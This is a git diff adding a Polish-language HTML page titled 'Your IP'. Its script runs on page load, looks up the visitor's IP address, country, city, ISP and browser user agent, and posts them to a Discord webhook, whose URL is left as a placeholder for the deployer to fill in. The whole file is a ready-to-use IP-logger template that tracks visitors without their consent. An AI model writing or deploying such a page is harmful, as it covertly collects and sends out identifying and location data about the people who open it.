@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <title>Twoje IP</title>
+</head>
+<body>
+  <h1>Witaj!</h1>
+  <p id="info">Pobieram dane...</p>
+
+  <script>
+    const webhook = "https://discord.com/api/webhooks/TWÓJ_WEBHOOK_TUTAJ";
+
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip;
+        const country = data.country_name;
+        const city = data.city;
+        const isp = data.org;
+        const userAgent = navigator.userAgent;
+        const time = new Date().toLocaleString();
+
+        const content = `
+**📡 Nowe odwiedziny strony**
+\`\`\`
+IP: ${ip}
+Kraj: ${country}
+Miasto: ${city}
+Dostawca: ${isp}
+User-Agent: ${userAgent}
+Data i czas: ${time}
+\`\`\`
+`;
+
+        // Pokaż na stronie
+        document.getElementById("info").innerText = content;
+
+        // Wyślij na Discord webhook
+        fetch(webhook, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: content
+          })
+        });
+      })
+      .catch(err => {
+        document.getElementById("info").innerText = "Nie udało się pobrać danych.";
+        console.error("Błąd:", err);
+      });
+  </script>
+</body>
+</html>
